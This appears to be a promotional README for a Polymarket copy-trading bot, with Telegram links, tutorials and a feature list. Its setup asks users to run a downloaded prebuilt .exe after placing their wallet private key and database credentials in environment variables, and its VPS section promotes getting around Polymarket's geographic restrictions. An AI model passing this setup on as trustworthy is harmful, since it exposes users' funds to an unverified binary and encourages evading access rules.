# 🚀 Polymarket Trading Bots Telegram Service

## 📹 YouTube Tutorials: Unlock Your Setup & Trading Power with the UI

### Copy Trading Bot Series
- ⚙️ Learn how to run and use the current codebase: [Setup & Usage Guide](https://www.youtube.com/watch?v=QLA1NJL32xs)
- 📹 Watch the Telegram UI walkthrough: [Tutorial Video](https://www.youtube.com/watch?v=gm8J2mmerBQ)
- 🧪 See the CLI test in action: [Simple Test / CLI Bot](https://www.youtube.com/watch?v=6ZRIIPzv3d8)

### Cycle End Sniper - Trading Bot Series
- ⚡ **[NEW]** [Cycle End Sniper |_Polymarket 5min Crypto Market_Trading Bot](https://www.youtube.com/watch?v=CipdY9aCCwE)  
  *Detects lightning-fast Crypto moves on Binance/Bybit and enters Polymarket 5-minute "Up or Down" positions BEFORE the market price adjusts → pure latency edge*

---
## 📱 Telegram Bot: Explore the Trading Simulator & Test in Action

- 🛡️ **Cycle End Sniper | Polymarket 5min Trading Bot**: [Cycle End Sniper](https://t.me/poly5mbot)  
  *(Note: Use this bot to experiment with the risk-free trading strategy in a simulated environment)*
- 🎯 Explore the Trading Simulator: [Simulator Bot](https://t.me/poly_copy_tg_bot)  
  *(Note: This is for educational purposes and demonstrates two types of trading)*  
- 🚀 Test the Trading Bot in Action: [Test Bot](https://t.me/poly_copy_prod_tg_bot)  
  *(Note: This is for educational purposes to see how the bot works in real trading)*  

---

## 📞 Contact & Support

- 📱 Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
- 🐦 X: [@soulcrancerdev](https://x.com/soulcrancerdev)

---

## 🚀 Let's Trade!!

### **🤖 Polymarket Copy Trading Rust Bot - for Windows**
- 🗂️ [polymarket-copy-trading-bot-x86_64.zip](https://github.com/user-attachments/files/25414423/polymarket-copy-trading-bot-x86_64.zip)

1. 📂 Extract `polymarket-copy-trading-bot-x86_64.zip` file.
2. ⚙️ Environment Variables Settings
   ```
   - USER_ADDRESSES=0xYourTraderAddress             # Traders to copy (comma-separated or JSON array)
   - PROXY_WALLET=0xYourWalletAddress               # Your wallet (must match PRIVATE_KEY)
   - PRIVATE_KEY=your_64_char_hex_private_key       # Private key without 0x prefix
   - RPC_URL=https://polygon-mainnet.infura.io/v3/YOUR_PROJECT_ID        # Polygon RPC endpoint (you can use Infura, Alchemy, or QuickNode)
   - MONGO_URI='mongodb+srv://user:pass@cluster.mongodb.net/database'    # ⚠️  Keep this private! Never share or commit to git
   - COPY_STRATEGY=PERCENTAGE                       # Copy strategy: PERCENTAGE, FIXED, or ADAPTIVE
   - COPY_SIZE=10.0                                 # PERCENTAGE: Percentage of trader's order (e.g., 10.0 = 10%)
   - MAX_ORDER_SIZE_USD=100.0                       # Maximum size for a single order in USD (default: 100.0)
   - MIN_ORDER_SIZE_USD=1.0                         # Minimum size for a single order in USD (default: 1.0)
   - PREVIEW_MODE=true                              # true: Monitor trades but DO NOT execute them (safe testing), false: live trading
   ```
3. ▶️ Run `polymarket-copy-trading-bot-x86_64.exe`

---
<p float="left">
   <img width="260" height="1026" alt="image" src="https://github.com/user-attachments/assets/b15b436a-a7f2-4a47-b970-aa113f294e74" />
   <img width="260" height="1026" alt="telegram bot-1" src="https://github.com/user-attachments/assets/cbe68dc3-939a-4856-8a82-8e59d5588b1c" />
   <img width="260" height="1026" alt="telegram bot-2" src="https://github.com/user-attachments/assets/3810d21f-8eaa-4503-80ab-eaa54604cc46" />
</p>

https://github.com/user-attachments/assets/2e462566-f4cc-45c3-a3b1-6aa7757b0f32

---
## ✨ Features
- 👥 **Multi-trader support** — Follow several traders at once; your edge is mirroring many minds instead of one.
- 📏 **Dynamic sizing** — Order size scales with your capital and strategy (percentage, fixed, or adaptive).
- 🔝 **Tiered multipliers** — Bigger trades can use different scaling than small ones.
- 📊 **Accurate bookkeeping** — Tracks every buy and sell so positions stay correct even when balances change.
- 📦 **Batched orders** — Groups small signals into fewer, larger orders when aggregation is enabled.
- ⚡ **Live execution** — Sub-second monitoring and immediate placement on the CLOB.
- 💾 **MongoDB-backed state** — All activity and positions stored for replay and analysis.
- 🛡️ **Slippage guards** — Avoids fills at worse-than-acceptable prices.

---
## 🚀 VPS Recommendation – Low-Latency Execution & GEO restrictions support

**Latency = edge** in Polymarket.

**[Trading VPS →](https://app.tradingvps.io/aff.php?aff=60)** is the go-to low-latency hosting solution among serious prediction-market and crypto bot runners.

- ⏱️ Sub-1 ms to major Polygon nodes  
- 🔒 Crypto/HFT-optimized locations  
- 📈 Exceptional uptime & network performance  

Note: Polymarket has some GEO restrictions, so many Polymarket traders are using our AMS VPS and love it.

---

## 🤝 Support & Community

⭐ Fork, star, and contribute to the project on GitHub.

📢 For the updates of the current copy trader w/ your tradin' logic, Reach out via Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
